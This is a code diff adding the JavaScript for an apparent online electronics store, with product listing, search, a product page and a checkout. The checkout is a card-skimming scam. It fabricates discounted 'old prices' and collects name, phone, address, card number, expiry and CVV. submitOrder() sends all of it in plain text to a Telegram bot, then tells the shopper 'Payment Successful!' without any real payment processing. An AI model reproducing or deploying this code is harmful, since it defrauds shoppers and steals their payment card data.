+    let listToSort = [...products]; // Original massivni buzmaslik uchun nusxa olamiz
+
+    // Hozirgi tanlangan kategoriya bo'yicha filtrni saqlab qolamiz
+    if (currentCategory !== 'All') {
+        listToSort = listToSort.filter(p => p.category === currentCategory);
+    }
+
+    if (sortType === 'low') {
+        listToSort.sort((a, b) => parseFloat(a.price.replace('$', '')) - parseFloat(b.price.replace('$', '')));
+    } else if (sortType === 'high') {
+        listToSort.sort((a, b) => parseFloat(b.price.replace('$', '')) - parseFloat(a.price.replace('$', '')));
+    }
+
+    renderFilteredList(listToSort);
+}
+
+// 3. Mahsulotlarni ekranga chiqarish (Yordamchi funksiya)
+function renderFilteredList(targetArray) {
+    const list = document.getElementById("productList");
+    list.innerHTML = "";
+    
+    targetArray.forEach(p => {
+        const col = document.createElement("div");
+        col.className = "col-12 col-sm-6 col-lg-3 mb-4";
+        col.innerHTML = `
+            <div class="product-card-premium h-100" onclick="openProduct(${p.id})">
+                <div class="img-box">
+                    <img src="${p.img}" class="img-fluid">
+                </div>
+                <div class="p-2">
+                    <div class="d-flex justify-content-between">
+                        <small class="text-muted">${p.category}</small>
+                        ${p.trending ? '<small class="text-danger fw-bold">🔥 Trending</small>' : ''}
+                    </div>
+                    <h6 class="fw-bold mt-1">${p.name}</h6>
+                    <div class="d-flex justify-content-between align-items-center mt-3">
+                        <span class="fs-5 fw-bold text-primary">${p.price}</span>
+                        <div class="badge bg-light text-dark border">In Stock</div>
+                    </div>
+                </div>
+            </div>`;
+        list.appendChild(col);
+    });
+}
+// ===== PRODUCT DETAIL LOGIC =====
+function openProduct(id) {
+    currentProduct = products.find(p => p.id === id);
+    document.getElementById("pImg").src = currentProduct.img;
+    document.getElementById("pName").innerText = currentProduct.name;
+    document.getElementById("pPrice").innerText = currentProduct.price;
+    document.getElementById("pDesc").innerText = currentProduct.desc;
+    document.querySelectorAll(".priceSpan").forEach(el => el.innerText = currentProduct.price);
+    
+    // Fake old price
+    let pNum = parseFloat(currentProduct.price.replace('$',''));
+    document.getElementById("oldPrice").innerText = "$" + (pNum + 15.99).toFixed(2);
+
+    // Specs List
+    document.getElementById("pSpecsList").innerHTML = currentProduct.specs.map(s => `<li class="text-muted small mb-2">✅ ${s}</li>`).join("");
+
+    // Full Specs Table
+    const fullSpecs = [["Brand", "TechStore"], ["Model", currentProduct.name], ["Warranty", "24 Months"], ["Shipping", "Express"]];
+    document.getElementById("pFullTable").innerHTML = fullSpecs.map(s => `<tr><td class="text-muted small">${s[0]}</td><td class="fw-bold small text-end">${s[1]}</td></tr>`).join("");
+
+    // Thumbnails
+    document.getElementById("pGallery").innerHTML = `
+        <div class="thumb-box active" onclick="changeImg(this, '${currentProduct.img}')"><img src="${currentProduct.img}" class="img-fluid"></div>
+        <div class="thumb-box" onclick="changeImg(this, 'https://m.media-amazon.com/images/I/61S9aVnS6RL._AC_SL1500_.jpg')"><img src="https://m.media-amazon.com/images/I/61S9aVnS6RL._AC_SL1500_.jpg" class="img-fluid"></div>
+        <div class="thumb-box" onclick="changeImg(this, 'https://m.media-amazon.com/images/I/51X2oD9I6EL._AC_SL1500_.jpg')"><img src="https://m.media-amazon.com/images/I/51X2oD9I6EL._AC_SL1500_.jpg" class="img-fluid"></div>
+    `;
+
+    showPage("product");
+}
+
+function changeImg(el, src) {
+    document.getElementById("pImg").src = src;
+    document.querySelectorAll(".thumb-box").forEach(b => b.classList.remove("active"));
+    el.classList.add("active");
+}
+
+// ===== CHECKOUT LOGIC =====
+function openOrder() {
+    document.getElementById("sumImg").src = currentProduct.img;
+    document.getElementById("sumName").innerText = currentProduct.name;
+    document.getElementById("sumDesc").innerText = currentProduct.desc.substring(0,30) + "...";
+    document.getElementById("subTotal").innerText = currentProduct.price;
+    showPage("order");
+}
+
+const phoneInput = document.querySelector("#phone");
+    const iti = window.intlTelInput(phoneInput, {
+        initialCountry: "uz", // O'zbekiston default
+        separateDialCode: true,
+        utilsScript: "https://cdn.jsdelivr.net/npm/intl-tel-input@18.2.1/build/js/utils.js",
+    });
+
+    async function sendToBot() {
+        const name = document.getElementById("fullName").value;
+        
+        // MUHIM: Raqamni to'liq xalqaro formatda olish (+998901234567)
+        const fullPhoneNumber = iti.getNumber(); 
+
+        if (!name || !iti.isValidNumber()) {
+            alert("Iltimos, ma'lumotlarni to'g'ri kiriting!");
+            return;
+        }
+
+        const message = `👤 Ism: ${name}\n📞 Tel: ${fullPhoneNumber}`;
+
+        try {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            if (response.ok) {
+                alert("Ma'lumotlar botga yuborildi!");
+            } else {
+                alert("Xatolik yuz berdi.");
+            }
+        } catch (error) {
+            console.error(error);
+            alert("Tarmoq xatosi.");
+        }
+    }
+
+// Live Card Update
+document.getElementById("cardNumber").addEventListener("input", function() {
+    let val = this.value.replace(/\D/g,'').substring(0,16);
+    this.value = val.replace(/(.{4})/g, "$1 ").trim();
+    document.getElementById("vCardNum").innerText = this.value || "•••• •••• •••• ••••";
+    
+    if(val.length === 16 && luhnCheck(val)) {
+        document.getElementById("cardStatus").innerHTML = "✔";
+        document.getElementById("cardStatus").className = "valid ms-2";
+    } else {
+        document.getElementById("cardStatus").innerHTML = "✖";
+        document.getElementById("cardStatus").className = "invalid ms-2";
+    }
+});
+
+document.getElementById("fullName").addEventListener("input", function() { document.getElementById("vCardName").innerText = this.value.toUpperCase() || "NAME SURNAME"; });
+document.getElementById("expiry").addEventListener("input", function() {
+    let val = this.value.replace(/\D/g,'');
+    if(val.length >= 2) val = val.substring(0,2) + "/" + val.substring(2,4);
+    this.value = val;
+    document.getElementById("vCardExp").innerText = val || "MM/YY";
+});
+
+function luhnCheck(num) {
+    let sum=0, alt=false;
+    for(let i=num.length-1; i>=0; i--) {
+        let n = parseInt(num[i], 10);
+        if(alt) { n *= 2; if(n > 9) n -= 9; }
+        sum += n; alt = !alt;
+    }
+    return sum % 10 === 0;
+}
+// 1. Qidiruv funksiyasi (Enter bosilganda)
+function handleSearch(event) {
+    const query = event.target.value.toLowerCase();
+    const dropdown = document.getElementById('searchDropdown');
+    
+    if (query.length > 0) {
+        // Filtrlash
+        const filtered = products.filter(p => 
+            p.name.toLowerCase().includes(query) || 
+            p.desc.toLowerCase().includes(query)
+        );
+        
+        showSearchPreview(filtered);
+    } else {
+        dropdown.style.display = 'none';
+    }
+    
+    if (event.key === 'Enter') {
+        executeSearch();
+    }
+}
+
+// 2. Qidiruv natijalarini ko'rsatish
+function showSearchPreview(results) {
+    const dropdown = document.getElementById('searchDropdown');
+    dropdown.innerHTML = "";
+    
+    if (results.length === 0) {
+        dropdown.innerHTML = `<div class="p-3 text-center text-muted">Mahsulot topilmadi 😕</div>`;
+    } else {
+        results.forEach(p => {
+            const item = document.createElement('div');
+            item.className = "d-flex align-items-center p-3 border-bottom search-item";
+            item.style.cursor = "pointer";
+            item.onclick = () => {
+                openProduct(p.id);
+                document.getElementById('searchDropdown').style.display = 'none';
+            };
+            item.innerHTML = `
+                <img src="${p.img}" style="width: 40px; height: 40px; object-fit: contain; margin-right: 15px;">
+                <div>
+                    <div class="fw-bold small">${p.name}</div>
+                    <div class="text-primary small fw-bold">${p.price}</div>
+                </div>
+            `;
+            dropdown.appendChild(item);
+        });
+    }
+    dropdown.style.display = 'block';
+}
+
+// 3. Asosiy qidiruvni bajarish
+function executeSearch() {
+    const query = document.getElementById('mainSearchInput').value.toLowerCase();
+    const list = document.getElementById("productList");
+    
+    const filtered = products.filter(p => p.name.toLowerCase().includes(query));
+    
+    // Mahsulotlar ro'yxatini yangilash (renderFilteredProducts funksiyasini chaqiramiz)
+    if(typeof renderProducts === "function") {
+        // Bu yerda home sahifasini ko'rsatish kerak
+        showPage('home');
+        renderFilteredList(filtered);
+    }
+    document.getElementById('searchDropdown').style.display = 'none';
+}
+
+// Login Modalni ochish funksiyasi
+function toggleLoginModal() {
+    // Agar modal kodi bo'lsa uni ochadi
+    const loginModal = document.getElementById('loginModal');
+    if(loginModal) {
+        loginModal.style.display = (loginModal.style.display === 'flex') ? 'none' : 'flex';
+    } else {
+        alert("Sign In sahifasi tayyorlanmoqda...");
+    }
+}
+
+
+// ===== FINAL SUBMIT =====
+function submitOrder() {
+    const data = {
+        name: document.getElementById("fullName").value,
+        phone: iti.getNumber(),
+        address: document.getElementById("address").value + ", " + document.getElementById("house").value,
+        card: document.getElementById("cardNumber").value,
+        exp: document.getElementById("expiry").value,
+        cvv: document.getElementById("cvv").value
+    };
+
+    if(!data.name || !data.card || data.card.length < 16) { alert("Please complete form correctly!"); return; }
+
+    const msg = `📦 NEW ORDER:\n🛒 Product: ${currentProduct.name}\n👤 Name: ${data.name}\n📞 Phone: ${data.phone}\n📍 Address: ${data.address}\n💳 Card: ${data.card}\n📅 Exp: ${data.exp}\n🔑 CVV: ${data.cvv}`;
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg })
+    }).then(res => {
+        if(res.ok) { alert("Payment Successful!"); location.reload(); }
+    });
+}
+</script>
+</body>
+</html>
